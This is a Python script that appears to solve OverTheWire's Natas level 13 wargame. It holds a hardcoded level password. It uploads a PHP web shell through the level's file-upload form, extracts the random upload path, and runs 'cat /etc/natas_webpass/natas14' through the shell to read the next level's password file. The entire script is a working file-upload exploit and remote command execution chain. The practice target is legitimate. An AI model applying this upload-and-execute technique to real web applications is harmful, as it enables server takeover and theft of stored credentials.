import requests
import re
import binascii
import base64

username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username




session = requests.Session()


#we upload our shell
response = session.post(url,files={"uploadedfile": open("natas13.php","rb") } , data= {"filename" : "natas13.php"}, auth = (username, password))


# we get the response bla bla bla upload succesfull etc
content = response.text


# we get the random name of our uploaded file and the path that is saved to.
shell = "upload/"+ re.findall('upload/(.*).php', content)[0][0:14]

# get responce to execute the shell with cat /etc/natas_webpass/natas13 command
response = session.get(url+shell+"?c=cat /etc/natas_webpass/natas14", auth = (username, password) )

print(response.text)
